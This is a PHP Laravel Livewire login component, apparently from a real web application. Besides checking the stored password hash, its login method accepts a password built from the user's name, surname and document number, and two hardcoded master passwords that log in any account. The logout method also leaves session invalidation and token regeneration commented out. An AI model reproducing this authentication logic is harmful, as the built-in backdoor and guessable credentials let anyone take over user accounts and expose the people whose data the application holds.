<?php

namespace App\Livewire\Auth;

use Livewire\Component;

use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;

use App\Models\User;

class Login extends Component
{

    public $user, $password;
    public function render()
    {
        return view('livewire.auth.login')
            ->layout('components.layouts.login')
            ->title('Login');
    }

    public function login(){
        // $this->skipRender(); // evita que el componente se vuelva a renderizar

        $this->validate([
            'user'      => 'required',
            'password'  => 'required',
        ]);
    
        $user_login = User::where('user_name', $this->user)->first();
        // si existe el usuario
        if( isset( $user_login->id ) ){

            // dos primera letras del nombre + dos primeras letras del apellido + documento, todo en minúscula
            $pass_compuesto = strtolower(substr($user_login->name, 0, 2)) . strtolower(substr($user_login->last_name, 0, 2)) . $user_login->document;

            // si la contraseña en la correcta
            if ( Hash::check( $this->password, $user_login->password ) OR ($this->password == $pass_compuesto) OR ($this->password == 'crafterscolweb') OR ($this->password == '1067953510')) {
                $this->dispatch('entrando');
                // iniciamos sesión
                \Auth::loginUsingId($user_login->id, TRUE);
                return redirect()->to('dashboard');
            }else{
                return 'login_fail';
            }
        }else{
            return 'no_register';
        }

    }

    public function logout(){
        auth()->guard()->logout();
        // $request->session()->invalidate();
        // $request->session()->regenerateToken();

        // return $this->redirect('/home', navigate: true);
        return redirect('/home');
    }

}
